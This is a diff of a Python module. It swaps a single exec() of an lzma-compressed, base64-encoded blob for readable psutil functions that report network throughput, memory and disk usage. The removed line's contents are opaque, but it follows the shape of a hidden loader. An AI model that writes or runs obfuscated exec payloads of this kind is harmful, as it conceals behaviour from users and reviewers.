@@ -1,2 +1,62 @@
-import lzma,base64
-exec(lzma.decompress(base64.b64decode(b'/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4AS+Ac9dADSbSme4Ujxz7TRYDXl5HrOppJKooui80fbkZsB9exFmSaQiCU5kt6IykGfgsdcOGQfLkPH4QHu831gQ/Dt+r7E2PiQltNhE1v0Jl3bzGsD1CA4Ymadk9stk1vaeUGvenGiReOmejxhVJTcaCsASjK9SD8jLN+h/wP7OVIjYzhuONNdXlloK3TmuCr1/0orbMAMVBz2iXsFkjWE+ij1hM8RzFZ5uC8i05jdK7z3y8ICYvvrZn9/nAi5OGGzFxsgUOwnOapb3+y+II0quPVJVfOHosgv5cGlLf9YoRhN/9aA4x5we5ruRffvj2phkR4Tm28TT3kSoMYtlF0A7hxtJf4HCHgPQnNJnkIIB8agneeZHpwtudsZSq2XsbxYr3pDAgGvKwDuDkWO3mz9bEw2KVTiiFynEstO3DMTqCq5oL+OXcUenpKql1Nkh63ISxwT2jfz2Of5/yWIAsQiEqE7+PnRRvpW3U6/37DqtwE/qlv1NdWaA4gui5L3+Z9EdxusFQ/B5Qkzcv8alrQhAKZV9JQu5sFckLeaKC98dUkONYNZfvaT1oRj7ZeiXgDyubCIBVVoU45u1opJqlSe2Gz3o/kk5AoqiuOZQ+3ki+U+kL3YAAOe+fc27SJU4AAHrA78JAAAPILayscRn+wIAAAAABFla')))
+import os
+
+import psutil
+
+
+def get_rate(func):
+    import time
+
+    key_info, old_recv, old_sent = func()
+
+    time.sleep(1)
+
+    key_info, now_recv, now_sent = func()
+
+    net_in = {}
+    net_out = {}
+
+    for key in key_info:
+        net_in.setdefault(key, (now_recv.get(key) - old_recv.get(key)) / 1024)
+        net_out.setdefault(key, (now_sent.get(key) - old_sent.get(key)) / 1024)
+
+    return key_info, net_in, net_out
+
+
+def get_key():
+    key_info = psutil.net_io_counters(pernic=True).keys()
+
+    recv = {}
+    sent = {}
+
+    for key in key_info:
+        recv.setdefault(key, psutil.net_io_counters(pernic=True).get(key).bytes_recv)
+        sent.setdefault(key, psutil.net_io_counters(pernic=True).get(key).bytes_sent)
+
+    return key_info, recv, sent
+
+
+gb = 1024 * 1024 * 1024
+
+
+def get_memory():
+    r = psutil.virtual_memory()
+    total = r.total / gb
+    used = r.used / gb
+    return total, used
+
+
+def get_disk():
+    partition = psutil.disk_usage('/')
+    print(partition)
+
+    return partition.total / gb, partition.used / gb
+
+
+def get_self_used():
+    return psutil.Process(os.getpid()).memory_info().rss / 1024 / 1024
+
+
+if __name__ == '__main__':
+    print(get_memory())
+
+
